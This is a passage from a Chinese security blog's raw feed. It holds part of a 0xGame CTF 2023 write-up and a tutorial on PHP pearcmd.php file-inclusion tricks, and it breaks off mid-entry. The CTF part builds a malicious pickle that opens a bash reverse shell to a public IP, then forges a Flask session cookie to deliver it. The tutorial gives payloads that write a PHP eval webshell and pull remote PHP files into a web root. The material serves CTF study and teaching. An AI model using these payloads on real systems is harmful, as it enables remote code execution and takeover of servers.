class="hljs-string">&#x27;notes&#x27;</span>] = notes<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, status=<span class="hljs-string">&#x27;add_success&#x27;</span>, note_id=note_id)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/delete_note&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete_note</span>():<br>    note_id = request.form.get(<span class="hljs-string">&#x27;note_id&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> note_id:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br>    <br>    notes = session.get(<span class="hljs-string">&#x27;notes&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> notes:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, status=<span class="hljs-string">&#x27;delete_failed&#x27;</span>, msg=<span class="hljs-string">&#x27;You have no notes&#x27;</span>)<br>    <br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> notes.get(note_id):<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, status=<span class="hljs-string">&#x27;delete_failed&#x27;</span>, msg=<span class="hljs-string">&#x27;This note does not exist&#x27;</span>)<br>    <br>    <span class="hljs-keyword">del</span> notes[note_id]<br>    session[<span class="hljs-string">&#x27;notes&#x27;</span>] = notes<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, status=<span class="hljs-string">&#x27;delete_success&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8000</span>, debug=<span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure><p>先生成一下爆破用的字典，以备后用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">hex_dict = []<br><br><span class="hljs-comment"># 生成两个字节的所有十六进制情况</span><br><span class="hljs-keyword">for</span> byte1 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>    <span class="hljs-keyword">for</span> byte2 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        hex_representation = <span class="hljs-string">f&quot;&#x27;<span class="hljs-subst">&#123;byte1:02x&#125;</span><span class="hljs-subst">&#123;byte2:02x&#125;</span>&#x27;&quot;</span>  <span class="hljs-comment"># 生成带有单引号的小写字母的十六进制表示</span><br>        hex_dict.append(hex_representation)  <span class="hljs-comment"># 将带有单引号的十六进制表示添加到列表</span><br><br><span class="hljs-comment"># 将列表写入 txt 文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;hex_dict.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> file:<br>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> hex_dict:<br>        file.write(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;item&#125;</span>\n&quot;</span>)<br></code></pre></td></tr></table></figure><p>可以得到字典文件hex_dict.txt</p><p>之后先得到session值，再用flask-unsign工具爆破得到key</p><p>flask-unsign –unsign –wordlist hex_dict.txt –cookie &lt; cookie.txt</p><p>解密之后的session是这样的</p><p><code>&#123;&#39;notes&#39;: &#123;&#39;3a8e70fd-a719-405a-85a1-e9dafd9da8b9&#39;: b&#39;\x80\x04\x95A\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x04Note\x94\x93\x94)\x81\x94&#125;\x94(\x8c\x05_name\x94\x8c\x04assa\x94\x8c\x08_content\x94\x8c\x07saxsasa\x94ub.&#39;&#125;&#125;</code></p><p>其中</p><p><code>b&#39;\x80\x04\x95A\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x04Note\x94\x93\x94)\x81\x94&#125;\x94(\x8c\x05_name\x94\x8c\x04assa\x94\x8c\x08_content\x94\x8c\x07saxsasa\x94ub.&#39;</code></p><p>就是pickle序列化结果，也是我们要注入的地方，首先我们去写一个代命令执行的pickle序列化的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Note</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.name=<span class="hljs-string">&quot;s&quot;</span><br>        self.content=<span class="hljs-string">&quot;sa&quot;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>): <br>        <span class="hljs-keyword">return</span> (os.system,(<span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/公网ip/port 0&gt;&amp;1&#x27;&quot;</span>,))<br><br><span class="hljs-comment"># 创建一个MaliciousObject实例</span><br>note = Note()<br><br><span class="hljs-comment"># 序列化这个对象</span><br>serialized_data = pickle.dumps(note)<br><span class="hljs-built_in">print</span>(serialized_data)<br></code></pre></td></tr></table></figure><p>得到</p><p><code>b&quot;\x80\x04\x95O\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c7bash -c &#39;bash -i &gt;&amp; /dev/tcp/111.229.227.162/1234 0&gt;&amp;1&#39;\x94\x85\x94R\x94.&quot;</code></p><p>将得到的字符串拼接到session，即得到</p><p><code>&#123;&#39;notes&#39;: &#123;&#39;3a8e70fd-a719-405a-85a1-e9dafd9da8b9&#39;: b&quot;\x80\x04\x95O\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c7bash -c &#39;bash -i &gt;&amp; /dev/tcp/111.229.227.162/1234 0&gt;&amp;1&#39;\x94\x85\x94R\x94.&quot;&#125;&#125;</code></p><p>再将这段代码去去用flask_session_cookie_manager3.py脚本加密</p><p>使用方法如下</p><p>encode</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain">usage: flask_session_cookie_manager&#123;2,3&#125;.py encode [-h] -s &lt;string&gt; -t &lt;string&gt;<br><br>optional arguments:<br>  -h, --help            show this help message and exit<br>  -s &lt;string&gt;, --secret-key &lt;string&gt;<br>                        Secret key<br>  -t &lt;string&gt;, --cookie-structure &lt;string&gt;<br>                        Session cookie structure<br></code></pre></td></tr></table></figure><p>decode</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain">usage: flask_session_cookie_manager&#123;2,3&#125;.py decode [-h] [-s &lt;string&gt;] -c &lt;string&gt;<br><br>optional arguments:<br>  -h, --help            show this help message and exit<br>  -s &lt;string&gt;, --secret-key &lt;string&gt;<br>                        Secret key<br>  -c &lt;string&gt;, --cookie-value &lt;string&gt;<br>                        Session cookie value<br></code></pre></td></tr></table></figure><p>加密语句</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">python3 flask_session_cookie_manager3.py encode -s <span class="hljs-string">&#x27;f6d5&#x27;</span> -t <span class="hljs-string">&quot;``&#123;&#x27;notes&#x27;: &#123;&#x27;3a8e70fd-a719-405a-85a1-e9dafd9da8b9&#x27;:b&quot;</span>\x80\x04\x95O\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c7bash -c <span class="hljs-string">&#x27;bash -i &gt;&amp; /dev/tcp/111.229.227.162/1234 0&gt;&amp;1&#x27;</span>\x94\x85\x94R\x94.<span class="hljs-string">&#x27;&#125;&#125;&quot;</span><br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F;其中&quot;是为了转义”不然会报错</p><p>上传之后</p><p>得到</p><p>之后就是为所欲为了</p><h1 id="Week4"><a href="#Week4" class="headerlink" title="Week4"></a>Week4</h1><h2 id="Web-3"><a href="#Web-3" class="headerlink" title="Web"></a>Web</h2><h3 id="spring"><a href="#spring" class="headerlink" title="spring"></a>spring</h3><p>打开有一行：</p><p>do you know what is actuator?</p><p>搜索actuator</p><p><a href="https://www.cnblogs.com/caoweixiong/p/15325382.html">Spring boot——Actuator 详解 - 曹伟雄 - 博客园 (cnblogs.com)</a></p><p>查看&#x2F;actuator&#x2F;env目录</p><p><img src="/2023/10/22/0xGameCTF2023/1697960451217-1697984113405-8.png" alt="1697960451217"></p><p>提示flag是password</p><p>查看&#x2F;actuator&#x2F;heapdump，发现可以下载，得到heapdump</p><p>搜索heapdump敏感信息</p><p><a href="https://blog.csdn.net/m0_60571842/article/details/132225568">heapdump敏感信息提取工具-JDumpSpider(一)_heapdump文件分析工具-CSDN博客</a></p><p>用工具<code>JDumpSpider-1.1-SNAPSHOT-full.jar</code></p><p><a href="https://github.com/whwlsfb/JDumpSpider">whwlsfb&#x2F;JDumpSpider: HeapDump敏感信息提取工具 (github.com)</a></p><p><img src="/2023/10/22/0xGameCTF2023/image-20231022154344433-1697984780986-77.png" alt="image-20231022154344433"></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于利用pearcmd进行文件包含的一些总结</title>
    <link href="/2023/10/18/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8pearcmd%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/"/>
    <url>/2023/10/18/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8pearcmd%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>PHP裸文件包含</p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>安装了pear扩展</p><p>php开启了<code>register_argc_argv</code>选项</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>php的pear扩展是一个命令行扩展管理工具，默认的安装路径在<code>/usr/local/lib/php/pearcmd.php</code>，在命令行下可以用<code>pear</code>或<code>php /usr/local/lib/php/pearcmd.php</code>运行，虽然不是在web的目录下，但是如果存在文件包含漏洞，我们就可以运行这个命令行工具</p><p>我们再来看<code>register_argc_argv</code>选项，在这个选项字段如果选了<code>ON</code>的话，URL中?后面的内容会全部传入至<code>$_SERVER[&#39;argv&#39;]</code>这个变量内，无论后面的内容是否有等号。</p><p>pear会在<code>pearcmd.php</code>获取命令行参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title class_">PEAR_Command</span>::<span class="hljs-title function_ invoke__">setFrontendType</span>(<span class="hljs-string">&#x27;CLI&#x27;</span>);<br><span class="hljs-variable">$all_commands</span> = <span class="hljs-title class_">PEAR_Command</span>::<span class="hljs-title function_ invoke__">getCommands</span>();<br><br><span class="hljs-variable">$argv</span> = <span class="hljs-title class_">Console_Getopt</span>::<span class="hljs-title function_ invoke__">readPHPArgv</span>();<br><span class="hljs-comment">// fix CGI sapi oddity - the -- in pear.bat/pear is not removed</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">php_sapi_name</span>() != <span class="hljs-string">&#x27;cli&#x27;</span> &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]) &amp;&amp; <span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;--&#x27;</span>) &#123;<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>    <span class="hljs-variable">$argv</span> = <span class="hljs-title function_ invoke__">array_values</span>(<span class="hljs-variable">$argv</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>而pear获取命令行参数的函数<code>Consoles/Getopt.php-&gt;readPHPArgv()</code>中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readPHPArgv</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$argv</span>;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$argv</span>)) &#123;<br>            <span class="hljs-keyword">if</span> (!@<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;argv&#x27;</span>])) &#123;<br>                <span class="hljs-keyword">if</span> (!@<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;HTTP_SERVER_VARS&#x27;</span>][<span class="hljs-string">&#x27;argv&#x27;</span>])) &#123;<br>                    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;Could not read cmd args (register_argc_argv=Off?)&quot;</span>;<br>                    <span class="hljs-keyword">return</span> PEAR::<span class="hljs-title function_ invoke__">raiseError</span>(<span class="hljs-string">&quot;Console_Getopt: &quot;</span> . <span class="hljs-variable">$msg</span>);<br>                &#125;<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;HTTP_SERVER_VARS&#x27;</span>][<span class="hljs-string">&#x27;argv&#x27;</span>];<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;argv&#x27;</span>];<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$argv</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>会先尝试<code>$argv</code>变量（这个变量储存在命令行模式下运行php脚本时传入的参数），然后再尝试<code>$_SERVER[&#39;argv&#39;]</code>变量，<code>$_SERVER[&#39;argv&#39;]</code>为我们可控的变量，这样，在文件包含的场景下，我们就可以运行pear命令行工具并用GET请求参数控制pear的命令行参数了。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>接下来就是寻找可以利用的命令了</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Commands:<br>build                  Build an Extension <span class="hljs-keyword">From</span> C Source<br>bundle                 Unpacks a Pecl Package<br>channel-<span class="hljs-built_in">add</span>            <span class="hljs-built_in">Add</span> a Channel<br>channel-alias          Specify an alias <span class="hljs-keyword">to</span> a channel name<br>channel-delete         <span class="hljs-built_in">Remove</span> a Channel <span class="hljs-keyword">From</span> the List<br>channel-discover       Initialize a Channel <span class="hljs-keyword">from</span> its<span class="hljs-built_in"> server</span><br><span class="hljs-built_in"></span>channel-<span class="hljs-built_in">info</span>           Retrieve Information on a Channel<br>channel-login          Connects <span class="hljs-keyword">and</span> authenticates <span class="hljs-keyword">to</span> remote channel<span class="hljs-built_in"> server</span><br><span class="hljs-built_in"></span>channel-logout         Logs out <span class="hljs-keyword">from</span> the remote channel<span class="hljs-built_in"> server</span><br><span class="hljs-built_in"></span>channel-update         Update an Existing Channel<br>clear-cache            Clear Web Services Cache<br>config-create          Create a<span class="hljs-built_in"> Default </span>configuration file<br>config-<span class="hljs-built_in">get</span>             Show One Setting<br>config-help            Show Information About Setting<br>config-<span class="hljs-built_in">set</span>             Change Setting<br>config-show            Show All<span class="hljs-built_in"> Settings</span><br><span class="hljs-built_in"></span>convert                Convert a package.xml 1.0 <span class="hljs-keyword">to</span> package.xml 2.0 format<br>cvsdiff                <span class="hljs-built_in">Run</span> a <span class="hljs-string">&quot;cvs diff&quot;</span> <span class="hljs-keyword">for</span> all files <span class="hljs-keyword">in</span> a package<br>cvstag                 <span class="hljs-built_in">Set</span> CVS Release Tag<br>download               Download Package<br>download-all           Downloads each available package <span class="hljs-keyword">from</span> the<span class="hljs-built_in"> default </span>channel<br><span class="hljs-built_in">info</span>                   Display information about a package<br>install                Install Package<br>list                   List Installed Packages <span class="hljs-keyword">In</span> The<span class="hljs-built_in"> Default </span>Channel<br>list-all               List All Packages<br>list-channels          List Available Channels<br>list-files             List Files <span class="hljs-keyword">In</span> Installed Package<br>list-upgrades          List Available Upgrades<br>login                  Connects <span class="hljs-keyword">and</span> authenticates <span class="hljs-keyword">to</span> remote<span class="hljs-built_in"> server </span>[Deprecated <span class="hljs-keyword">in</span> favor of channel-login]<br>logout                 Logs out <span class="hljs-keyword">from</span> the remote<span class="hljs-built_in"> server </span>[Deprecated <span class="hljs-keyword">in</span> favor of channel-logout]<br>makerpm                Builds an RPM spec file <span class="hljs-keyword">from</span> a PEAR package<br>package                Build Package<br>package-dependencies   Show package dependencies<br>package-validate       Validate Package Consistency<br>pickle                 Build PECL Package<br>remote-<span class="hljs-built_in">info</span>            Information About Remote Packages<br>remote-list            List Remote Packages<br>run-scripts            <span class="hljs-built_in">Run</span> Post-Install Scripts bundled with a package<br>run-tests              <span class="hljs-built_in">Run</span> Regression Tests<br>search                 Search remote package database<br>shell-test             Shell<span class="hljs-built_in"> Script </span>Test<br>sign                   Sign a package distribution file<br>svntag                 <span class="hljs-built_in">Set</span> SVN Release Tag<br>uninstall              Un-install Package<br>update-channels        Update the Channel List<span class="hljs-built_in"></span><br><span class="hljs-built_in">upgrade </span>              <span class="hljs-built_in"> Upgrade </span>Package<br>upgrade-all           <span class="hljs-built_in"> Upgrade </span>All Packages [Deprecated <span class="hljs-keyword">in</span> favor of calling<span class="hljs-built_in"> upgrade </span>with <span class="hljs-literal">no</span> parameters]<br>Usage: pear [options] command [command-options] &lt;parameters&gt;<span class="hljs-built_in"></span><br><span class="hljs-built_in">Type </span><span class="hljs-string">&quot;pear help options&quot;</span> <span class="hljs-keyword">to</span> list all options.<span class="hljs-built_in"></span><br><span class="hljs-built_in">Type </span><span class="hljs-string">&quot;pear help shortcuts&quot;</span> <span class="hljs-keyword">to</span> list all command shortcuts.<span class="hljs-built_in"></span><br><span class="hljs-built_in">Type </span><span class="hljs-string">&quot;pear help version&quot;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;pear version&quot;</span> <span class="hljs-keyword">to</span> list version information.<span class="hljs-built_in"></span><br><span class="hljs-built_in">Type </span><span class="hljs-string">&quot;pear help &lt;command&gt;&quot;</span> <span class="hljs-keyword">to</span> <span class="hljs-built_in">get</span> the help <span class="hljs-keyword">for</span> the specified command.<br></code></pre></td></tr></table></figure><p>现在介绍三种利用手法</p><p>为了试验这几种方法我用docker在本地搭建了一个文件包含环境，镜像是<code>php:7.4-apache</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="config-create"><a href="#config-create" class="headerlink" title="config-create"></a>config-create</h3><p>此方法来自于<a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">p神博客</a></p><p>此命令的参数和用法如下</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">config-<span class="hljs-keyword">create</span>: must have <span class="hljs-number">2</span> parameters, root <span class="hljs-keyword">path</span> <span class="hljs-keyword">and</span> filename <span class="hljs-keyword">to</span> save <span class="hljs-keyword">as</span><br></code></pre></td></tr></table></figure><p>就是要我们输入两个参数，一个是绝对路径，还有保存配置文件的文件名</p><p>尝试一下使用以下这个命令看下效果</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">pear config-create <span class="hljs-string">/114514whatever</span> <span class="hljs-string">/tmp/test.txt</span><br></code></pre></td></tr></table></figure><p><img src="/2023/10/18/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8pearcmd%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/pearcmd_p1.jpg" alt="pearcmd_p1"></p><p>可以看见我们已经写入一个配置文件了，检查下内容</p><p><img src="/2023/10/18/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8pearcmd%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/pearcmd_p2.jpg" alt="pearcmd_p2"></p><p>第一个参数的内容会被写入文件，如果我们将第一个参数换成文件内容的话我们就可以写入可包含的文件了</p><p>payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);?&gt;+/tmp/test.php<br></code></pre></td></tr></table></figure><p><img src="/2023/10/18/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8pearcmd%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/pearcmd_p3.jpg" alt="pearcmd_p3"></p><p>包含结果：</p><p><img src="/2023/10/18/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8pearcmd%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/pearcmd_p4.jpg" alt="pearcmd_p4"></p><p>我们来看下写入的文件</p><p><img src="/2023/10/18/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8pearcmd%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/pearcmd_p5.jpg" alt="pearcmd_p5"></p><p>可以看见<code>/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@eval($_POST[&#39;cmd&#39;]);?&gt;</code>整个被作为参数传入了命令行，但是get参数file被正常解析了，这是因为前面说过的即使URL中存在等号，问号后的内容一样会被传入<code>$_SERVER[&#39;argv&#39;]</code></p><h3 id="install"><a href="#install" class="headerlink" title="install"></a>install</h3><p>此方法来自<a href="https://blog.szfszf.top/article/57/">jrXnm师傅的博客</a></p><p>先来看看install的常规用法：</p><p>我在我vps上挂了一个php文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">phpinfo</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后通过pear下载</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">pear install <span class="hljs-link">http://</span>[<span class="hljs-string">vps</span>]:[port]/test1.php<br></code></pre></td></tr></table></figure><p>结果：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">pear install <span class="hljs-link">http://</span>[<span class="hljs-string">vps</span>]:[port]/test1.php<br>downloading test1.php ...<br>Starting to download test1.php (20 bytes)<br>....done: 20 bytes<br>Could not get contents of package &quot;/tmp/pear/download/test1.php&quot;. Invalid tgz file.<br>Download of &quot;<span class="hljs-link">http://</span>[<span class="hljs-string">vps</span>]:[port]/test1.php&quot; succeeded, but it is not a valid package archive<br>Invalid or missing remote package file<br>install failed<br></code></pre></td></tr></table></figure><p>结果在<code>/tmp/pear/download/</code>目录下有一个<code>test1.php</code></p><p>然后<code>install</code>有<code>--installroot</code>这个选项可以指定他的安装目录，这里可以构造payload远程下载我们的文件了</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://localhost:3354/?+install+--installroot+&amp;file=/usr/local/lib/php/pearcmd.php&amp;+http://</span>[<span class="hljs-string">vps</span>]:[port]/test1.php<br></code></pre></td></tr></table></figure><p>这个要被包含的文件就在web目录的<code>&amp;file=/usr/local/lib/php/pearcmd.php\&amp;/tmp/pear/download/</code>下，我们把路径url编码一下再包含</p><p><img src="/2023/10/18/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8pearcmd%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/pearcmd_p6.jpg" alt="pearcmd_p6"></p><p>成功了</p><h3 id="download"><a href="#download" class="headerlink" title="download"></a>download</h3><p>先查看一下download的用法</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">pear download <span class="hljs-selector-attr">[option]</span> <span class="hljs-selector-attr">[package]</span><br>#这里的option只有一个-Z, <span class="hljs-attr">--nocompress</span>，下载一个未压缩的tar包<br></code></pre></td></tr></table></figure><p>尝试一下下恶意的php文件</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">pear download <span class="hljs-link">http://</span>[<span class="hljs-string">vps</span>]:[port]/test1.php<br>downloading test1.php ...<br>Starting to download test1.php (20 bytes)<br>....done: 20 bytes<br>Could not get contents of package &quot;/var/www/html/test1.php&quot;. Invalid tgz file.<br>Download of &quot;<span class="hljs-link">http://</span>[<span class="hljs-string">vps</span>]:[port]/test1.php&quot; succeeded, but it is not a valid package archive<br>Invalid or missing remote package file<br>download 